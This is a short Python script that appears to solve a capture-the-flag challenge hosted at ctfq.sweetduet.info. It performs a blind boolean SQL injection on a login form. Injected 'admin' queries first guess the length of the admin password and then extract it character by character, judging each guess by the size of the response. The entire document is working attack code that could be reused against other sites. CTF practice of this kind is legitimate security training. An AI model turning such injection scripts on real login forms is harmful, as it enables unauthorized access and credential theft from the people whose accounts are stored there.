import requests
from string import ascii_letters, octdigits

class Solve:
    def __init__(self):
        self.url = 'http://ctfq.sweetduet.info:10080/~q6/'
        self.data = data = {'id': '', 'pass': ''}
    
    def post_form(self, **kwargs):
        res = requests.post(
            self.url,
            data = kwargs.get('data'),
        )
        return res.text
    
    def get_pass_length(self):
        sql = "admin' AND (SELECT LENGTH(pass) FROM user WHERE id='admin') = {}; --"
        for length in range(50):
            self.data['id'] = sql.format(length)
            res = self.post_form(data=self.data)
            if len(res) > 2000:
                return length
    
    def get_pass(self):
        flag = ''
        pass_length =  self.get_pass_length()
        sql = "admin' AND SUBSTR((SELECT pass FROM user WHERE id='admin'), {}, {}) = '{}'; --"
        for index in range(1, 22):
            for string in ascii_letters + octdigits + '_':
                self.data['id'] = sql.format(1, index, flag + string)
                res = self.post_form(data=self.data)
                if len(res) > 2000:
                    flag += string
                    break
        return flag

if __name__ == '__main__':
    solve = Solve()
    print(solve.get_pass())
